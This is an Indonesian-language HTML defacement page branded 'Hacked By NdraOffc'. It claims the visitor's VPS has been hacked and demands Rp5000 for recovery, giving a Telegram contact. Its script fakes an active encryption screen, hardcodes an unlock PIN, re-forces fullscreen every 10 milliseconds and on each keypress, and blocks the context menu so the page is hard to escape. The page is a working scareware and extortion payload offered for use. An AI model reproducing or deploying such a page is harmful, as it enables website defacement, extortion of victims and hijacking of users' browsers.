<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Trojan Hacked By Ndra</title>
  <link href="https://fonts.googleapis.com/css2?family=Kelly+Slab&family=Inconsolata&display=swap" rel="stylesheet">
  <script src="https://unpkg.com/lucide@latest"></script>
  <style>
    :root {
      --bg: #000;
      --fg: #e9e9e9;
      --accent: #ff1b1b;
      --muted: #bdbdbd;
    }
    
    html, body {
      height: 100%; margin: 0; background: #000;
      color: var(--fg); font-family: 'Inconsolata', monospace;
      overflow: hidden; cursor: crosshair; user-select: none;
    }

    body::before {
      content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: url('https://files.catbox.moe/c1as3h.jpg') no-repeat center center;
      background-size: cover; filter: brightness(0.7); z-index: 0;
    }

    #matrix-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.7; }

    .centered { 
      position: relative; z-index: 10;
      display: flex; flex-direction: column; justify-content: center; align-items: center;
      height: 100vh; width: 100%; text-align: center; padding: 15px; box-sizing: border-box;
    }

    .badge {
      width: 20vh; height: 20vh; max-width: 160px; max-height: 160px;
      border-radius: 50%; overflow: hidden; border: 3px solid var(--accent);
      box-shadow: 0 0 30px var(--accent); margin-bottom: 2vh;
      background: #000; animation: breathing 4s ease-in-out infinite;
    }
    .badge img { width: 100%; height: 100%; object-fit: cover; }

    @keyframes breathing {
      0%, 100% { box-shadow: 0 0 15px var(--accent); transform: scale(1); }
      50% { box-shadow: 0 0 35px var(--accent); transform: scale(1.05); }
    }

    h1 { font-family: 'Kelly Slab'; font-size: 3.8vh; margin: 1vh 0; text-shadow: 0 0 10px var(--accent); }
    h1 span { color: var(--accent); font-weight: bold; }

    .text-box h2 { font-family: 'Kelly Slab'; font-size: 1.8vh; margin: 2px 0; color: var(--muted); line-height: 1.5; }

    /* PIN Minimalis Transparan */
    #pin-area { margin: 2vh 0; z-index: 100; }
    #pin-input {
      background: rgba(255, 255, 255, 0.1); border: 1px solid var(--accent);
      color: #fff; text-align: center; padding: 8px; width: 120px;
      font-size: 18px; letter-spacing: 3px; outline: none;
      backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);
    }
    #unlock-btn {
      background: var(--accent); border: none; color: #fff;
      padding: 9px 15px; font-weight: bold; cursor: pointer; vertical-align: top;
    }

    .status-msg { font-size: 12px; color: var(--accent); font-weight: bold; margin-bottom: 10px; height: 15px; }
    .divider { width: 70%; height: 2px; margin: 1vh auto; background: linear-gradient(90deg, transparent, var(--accent), transparent); }

    .meta-list { font-size: 1.5vh; color: #cfcfcf; }
    .meta-list a { color: var(--accent); text-decoration: none; font-weight: bold; }
  </style>
</head>
<body onclick="ignite()">

  <canvas id="matrix-canvas"></canvas>

  <div class="centered">
    <div class="badge"><img src="https://files.catbox.moe/zoag8q.jpg"></div>
    
    <h1>Hacked By <span>NdraOffc</span></h1>

    <div class="text-box">
        <h2>Maaf Admin/User, VPS anda telah kami retas.</h2>
        <h2>Bayar Rp5000 untuk memulihkan sistem anda.</h2>
    </div>
    
    <div id="statusLabel" class="status-msg">TOUCH TO INITIALIZE SYSTEM</div>

    <div id="pin-area">
      <input type="password" id="pin-input" maxlength="4" placeholder="PIN">
      <button id="unlock-btn" onclick="checkPin(event)">OK</button>
    </div>

    <div class="divider"></div>

    <div class="meta-list">
      <strong>Defaced by:</strong> NdraIsHere | <strong>Telegram:</strong> <a href="https://t.me/NdraXzzz" target="_blank">t.me/NdraXzzz</a>
    </div>

    <audio id="music" loop>
      <source src="https://files.catbox.moe/b59co3.mp3" type="audio/mpeg">
    </audio>
  </div>

  <script>
    const music = document.getElementById('music');
    const status = document.getElementById('statusLabel');
    const pinIn = document.getElementById('pin-input');
    let isRunning = false;
    const MY_PIN = "7799"; 

    // --- Efek Matrix ---
    const canvas = document.getElementById('matrix-canvas');
    const ctx = canvas.getContext('2d');
    function initMatrix() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
    initMatrix();
    const rainDrops = Array(Math.floor(canvas.width / 16)).fill(1);
    function draw() {
      ctx.fillStyle = "rgba(0, 0, 0, 0.1)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "#ff1b1b"; ctx.font = "bold 16px monospace";
      rainDrops.forEach((y, i) => {
        const text = String.fromCharCode(Math.random() * 128);
        ctx.fillText(text, i * 16, y * 16);
        if (y * 16 > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
        rainDrops[i]++;
      });
    }
    setInterval(draw, 40);

    // --- Fungsi Fullscreen ---
    function goFull() {
      const el = document.documentElement;
      if (!document.fullscreenElement && !document.webkitFullscreenElement) {
        if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
      }
    }

    // --- Start ---
    function ignite() {
      if (isRunning) return;
      isRunning = true;
      music.play();
      goFull();
      status.innerText = "ENCRYPTION ACTIVE - ENTER KEY";
    }

    // --- Verifikasi PIN Tanpa Alert (Anti-Exit Fullscreen) ---
    function checkPin(e) {
      // Mencegah bubbling agar tidak memicu listener body
      if(e) e.stopPropagation();
      
      if (pinIn.value === MY_PIN) {
        status.style.color = "#00ff00";
        status.innerText = "ACCESS GRANTED. DECRYPTING...";
        setTimeout(() => { location.reload(); }, 2000);
      } else {
        // Jangan pakai alert! Langsung ganti teks status saja
        status.style.color = "#ff1b1b";
        status.innerText = "WRONG KEY! CONTACT @NdraXzzz";
        pinIn.value = "";
        
        // Tetap paksa fullscreen
        goFull();

        // Kembalikan teks status setelah 3 detik
        setTimeout(() => {
            if(status.innerText !== "ACCESS GRANTED. DECRYPTING...") {
                status.innerText = "ENCRYPTION ACTIVE - ENTER KEY";
            }
        }, 3000);
      }
    }

    // --- Anti-Exit Super Ketat ---
    setInterval(() => {
      if (isRunning) goFull();
    }, 10); // Cek setiap 0.3 detik

    // Blokir Klik Kanan
    document.addEventListener('contextmenu', e => e.preventDefault());
    
    // Blokir ESC atau tombol navigasi lainnya (semampu browser)
    window.addEventListener('keydown', (e) => {
        if(isRunning) goFull();
    });
  </script>
</body>
</html>
